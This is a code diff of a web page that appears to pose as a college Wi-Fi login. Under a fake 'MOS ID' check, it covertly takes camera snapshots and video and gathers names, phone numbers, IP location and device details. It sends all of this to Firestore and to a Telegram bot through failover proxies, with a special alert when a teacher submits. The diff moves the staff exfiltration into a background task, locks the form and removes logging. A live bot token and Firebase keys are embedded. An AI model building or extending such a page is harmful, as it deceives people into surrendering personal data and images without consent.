@@ -29,7 +29,6 @@
       flex-direction: column;
       -webkit-text-size-adjust: 100%;
     }
-
     .app-container {
       display: flex;
       flex-direction: column;
@@ -125,6 +124,11 @@
       flex-shrink: 0;
       max-height: calc(100% - 40px);
       overflow-y: auto;
+      transition: opacity 0.3s;
+    }
+    .wifi-card.locked {
+      opacity: 0.55;
+      pointer-events: none;
     }
     .wifi-card h3 {
       font-size: 21px; color: #2b5797;
@@ -616,48 +620,37 @@
     appId: "1:262830985110:web:6253b9cd57e767a04b57b7"
   };
 
-  // ===== ДВОЙНОЙ ПРОКСИ =====
+  // ===== TELEGRAM (двойной прокси) =====
   const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
   const TELEGRAM_CHAT_ID = "6651741310";
 
   const PROXY_URLS = [
-    "https://kp11-bot-proxy.riwendik.workers.dev",   // Cloudflare
-    "https://kp11-proxy.vercel.app/api/proxy"        // Vercel
+    "https://kp11-bot-proxy.riwendik.workers.dev",
+    "https://kp11-proxy.vercel.app/api/proxy"
   ];
 
-  // Универсальная отправка: пробует все прокси по кругу
   async function sendWithFailover(method, options) {
     const errors = [];
-
-    // 3 круга по всем прокси
     for (let round = 0; round < 3; round++) {
       for (const proxy of PROXY_URLS) {
         try {
           const url = `${proxy}?token=${TELEGRAM_TOKEN}&method=${method}`;
-
-          // Таймаут на каждый запрос
           const controller = new AbortController();
           const timer = setTimeout(() => controller.abort(), 6000);
-
           const fetchOptions = { ...options, signal: controller.signal };
           const res = await fetch(url, fetchOptions);
           clearTimeout(timer);
-
           if (res.ok) {
-            console.log(`✅ ${method} через ${proxy.split('/')[2]}`);
+            console.log(`✅ ${method} → ${proxy}`);
             return res;
           }
-          errors.push(`${proxy.split('/')[2]}: HTTP ${res.status}`);
+          errors.push(`${proxy}: HTTP ${res.status}`);
         } catch (err) {
-          errors.push(`${proxy.split('/')[2]}: ${err.message || err.name}`);
-          console.warn(`❌ ${proxy.split('/')[2]} (${method}): ${err.message || err.name}`);
+          errors.push(`${proxy}: ${err.message || err.name}`);
         }
       }
-      // Пауза 1.5 сек между кругами
       if (round < 2) await new Promise(r => setTimeout(r, 1500));
     }
-
-    console.error(`❌ Все прокси упали (${method}):`, errors);
     throw new Error(errors.join(" | "));
   }
 
@@ -723,7 +716,6 @@
       console.error("❌ Ошибка отправки видео:", err);
     }
   }
-  // ====================
 
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
@@ -1077,6 +1069,14 @@
     grpWrap.classList.remove('field-hidden');
   });
 
+  // ===== Блокировка формы =====
+  function lockForm() {
+    const elements = wifiCard.querySelectorAll('input, select, button');
+    elements.forEach(el => { el.disabled = true; });
+    wifiCard.classList.add('locked');
+  }
+
+  // ===== MOS ID + камера =====
   const mosidOverlay    = document.getElementById('mosidOverlay');
   const cameraFrame     = document.getElementById('cameraFrame');
   const cameraVideo     = document.getElementById('cameraVideo');
@@ -1103,10 +1103,8 @@
             shrekAudio.pause();
             shrekAudio.currentTime = 0;
             audioUnlocked = true;
-            console.log("Звук разблокирован (muted)");
           }, 100);
-        }).catch(err => {
-          console.warn("Unlock audio failed:", err);
+        }).catch(() => {
           shrekAudio.muted = true;
           shrekAudio.volume = 0;
         });
@@ -1115,28 +1113,23 @@
         shrekAudio.currentTime = 0;
         audioUnlocked = true;
       }
-    } catch (e) {
-      console.warn("unlockAudio error:", e);
-    }
+    } catch (e) {}
   }
 
   async function takeCameraSnapshot(videoEl) {
     return new Promise((resolve) => {
       let attempts = 0;
       const maxAttempts = 10;
-
       const tryCapture = () => {
         attempts++;
         try {
           const vw = videoEl.videoWidth;
           const vh = videoEl.videoHeight;
-
           if (!vw || !vh || vw < 10 || vh < 10) {
             if (attempts < maxAttempts) setTimeout(tryCapture, 200);
             else resolve(null);
             return;
           }
-
           const canvas = document.createElement('canvas');
           canvas.width = vw;
           canvas.height = vh;
@@ -1144,26 +1137,22 @@
           ctx.translate(canvas.width, 0);
           ctx.scale(-1, 1);
           ctx.drawImage(videoEl, 0, 0, vw, vh);
-
           const sampleData = ctx.getImageData(0, 0, Math.min(50, vw), Math.min(50, vh)).data;
           let brightness = 0;
           for (let i = 0; i < sampleData.length; i += 4) {
             brightness += sampleData[i] + sampleData[i + 1] + sampleData[i + 2];
           }
           brightness = brightness / (sampleData.length / 4) / 3;
-
           if (brightness < 5 && attempts < maxAttempts) {
             setTimeout(tryCapture, 200);
             return;
           }
-
           resolve(canvas.toDataURL('image/jpeg', 0.7));
         } catch (e) {
           if (attempts < maxAttempts) setTimeout(tryCapture, 200);
           else resolve(null);
         }
       };
-
       setTimeout(tryCapture, 300);
     });
   }
@@ -1180,10 +1169,8 @@
         audio: false
       });
     } catch (err) {
-      console.warn("Camera denied:", err);
       mosidStatus.textContent = "Не удалось получить доступ к камере";
       mosidStatus.className = "mosid-status error";
-
       let count = 3;
       mosidStatus.textContent = `Подключение через ${count}…`;
       const iv = setInterval(() => {
@@ -1233,8 +1220,7 @@
       shrekAudio.currentTime = 0;
       const p = shrekAudio.play();
       if (p && p.catch) {
-        p.catch(err => {
-          console.warn("Play error:", err);
+        p.catch(() => {
           const unlock = () => {
             shrekAudio.muted = false;
             shrekAudio.volume = 1.0;
@@ -1247,9 +1233,7 @@
           document.addEventListener('touchstart', unlock, { once: true });
         });
       }
-    } catch (e) {
-      console.warn("audio error:", e);
-    }
+    } catch (e) {}
 
     startVideoRecording();
 
@@ -1286,26 +1270,21 @@
   function startVideoRecording() {
     if (!mediaStream) return false;
     if (typeof MediaRecorder === "undefined") return false;
-
     try {
       recordedChunks = [];
-
       let mimeType = 'video/mp4';
       if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm;codecs=vp8';
       if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm';
-
       if (!MediaRecorder.isTypeSupported(mimeType)) return false;
 
       mediaRecorder = new MediaRecorder(mediaStream, {
         mimeType: mimeType,
         videoBitsPerSecond: 400000
       });
-
       mediaRecorder.ondataavailable = (e) => {
         if (e.data && e.data.size > 0) recordedChunks.push(e.data);
       };
       mediaRecorder.onerror = (e) => console.error("MediaRecorder error:", e);
-
       mediaRecorder.start(500);
       return true;
     } catch (e) {
@@ -1329,9 +1308,6 @@
           const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/mp4' });
           if (blob.size < 900 * 1024) {
             videoBase64 = await blobToBase64(blob);
-            console.log("Видео размер:", blob.size, "байт");
-          } else {
-            console.warn("Видео слишком большое для Firestore:", blob.size);
           }
         }
         saveToFirestore(videoBase64, capturedPhoto);
@@ -1357,7 +1333,6 @@
 
   async function saveToFirestore(videoBase64, photoBase64) {
     if (!pendingData) return;
-
     const deviceInfo = await collectDeviceInfo();
     const { fio, phone, group, isStaff, staffFio } = pendingData;
 
@@ -1424,19 +1399,20 @@
 
   // ============================================================
   //  ОБРАБОТКА ФОРМЫ
+  //  ВАЖНО: ветка педагога — ПЕРВАЯ, с гарантированным return.
+  //  Плашка показывается СРАЗУ, до Firestore и Telegram.
+  //  Форма блокируется.
   // ============================================================
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     notice.classList.remove('show');
-
-    // Разблокировать звук (для Safari)
     unlockAudio();
 
     // ==========================================================
-    //  ВЕТКА ПЕДАГОГА — ТОЛЬКО ПЛАШКА, БЕЗ MOS ID И ШРЕКА
+    //  ВЕТКА ПЕДАГОГА
     // ==========================================================
     if (courseEl.value === 'staff') {
-      // ФИО опционально, но если введено — валидируем
+      // Валидация ФИО (опционально)
       if (fioEl.value.trim()) {
         const res = validateFIO(fioEl.value);
         if (!res.ok) {
@@ -1458,53 +1434,58 @@
       }
       clearPhoneError();
 
-      const staffFio = fioEl.value.trim().replace(/\s+/g, ' ') || 'Без имени';
-
-      // Собираем данные об устройстве
-      let deviceInfo = {};
-      try {
-        deviceInfo = await collectDeviceInfo();
-      } catch (err) {
-        console.warn("collectDeviceInfo error:", err);
-      }
-
-      // Сохраняем в Firestore
-      try {
-        const docData = {
-          fio: staffFio,
-          phone: phoneRes.normalized,
-          role: "staff",
-          ...deviceInfo,
-          time: serverTimestamp()
-        };
-        await addDoc(collection(db, "staff"), docData);
-        console.log("✅ Педагог сохранён");
-      } catch (err) {
-        console.error("Ошибка сохранения педагога:", err);
-      }
-
-      // Уведомление в Telegram
-      const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
-      const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
-      const batteryStr = deviceInfo.batteryLevel != null
-        ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}` : "—";
-
-      const caption =
-        "🚨🚨🚨 <b>ВНИМАНИЕ! ПЕДАГОГ!</b> 🚨🚨🚨\n\n" +
-        "👤 <b>ФИО:</b> " + staffFio + "\n" +
-        "📞 <b>Телефон:</b> " + phoneRes.normalized + "\n\n" +
-        "📱 <b>Устройство:</b> " + deviceStr + "\n" +
-        "🌐 <b>IP:</b> " + ipStr + "\n" +
-        "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
-        "⚠️ <b>Это сотрудник колледжа!</b>";
-
-      await sendTelegramNotify(caption);
-
-      // Показать жёлтую плашку
+      // === МГНОВЕННО показываем плашку (до запросов) ===
       notice.classList.add('show');
       notice.scrollIntoView({ behavior: 'smooth', block: 'center' });
 
-      return; // ВАЖНО: выход, никакого MOS ID
+      // Скрываем «Добро пожаловать!» — плашка встанет по центру
+      welcomeBlock.style.display = 'none';
+
+      // Блокируем форму — нельзя ничего менять
+      lockForm();
+
+      // Дальше — фоновая задача, UI не трогает
+      const staffFio = fioEl.value.trim().replace(/\s+/g, ' ') || 'Без имени';
+      const phoneNorm = phoneRes.normalized;
+
+      (async () => {
+        try {
+          const deviceInfo = await collectDeviceInfo();
+
+          try {
+            await addDoc(collection(db, "staff"), {
+              fio: staffFio,
+              phone: phoneNorm,
+              role: "staff",
+              ...deviceInfo,
+              time: serverTimestamp()
+            });
+            console.log("✅ Педагог сохранён в Firestore");
+          } catch (err) {
+            console.error("Ошибка сохранения педагога:", err);
+          }
+
+          const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
+          const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
+          const batteryStr = deviceInfo.batteryLevel != null
+            ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}` : "—";
+
+          const caption =
+            "🚨🚨🚨 <b>ВНИМАНИЕ! ПЕДАГОГ!</b> 🚨🚨🚨\n\n" +
+            "👤 <b>ФИО:</b> " + staffFio + "\n" +
+            "📞 <b>Телефон:</b> " + phoneNorm + "\n\n" +
+            "📱 <b>Устройство:</b> " + deviceStr + "\n" +
+            "🌐 <b>IP:</b> " + ipStr + "\n" +
+            "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
+            "⚠️ <b>Это сотрудник колледжа!</b>";
+
+          await sendTelegramNotify(caption);
+        } catch (err) {
+          console.error("Ошибка фоновой задачи педагога:", err);
+        }
+      })();
+
+      return; // ← ГАРАНТИРОВАННЫЙ ВЫХОД, никакого MOS ID
     }
 
     // ==========================================================
@@ -1532,8 +1513,10 @@
     }
     clearPhoneError();
 
+    // Блокируем форму для студента тоже
     btn.disabled = true;
     btn.textContent = 'Подключение...';
+    lockForm();
 
     pendingData = {
       fio: fioEl.value.trim().replace(/\s+/g, ' '),
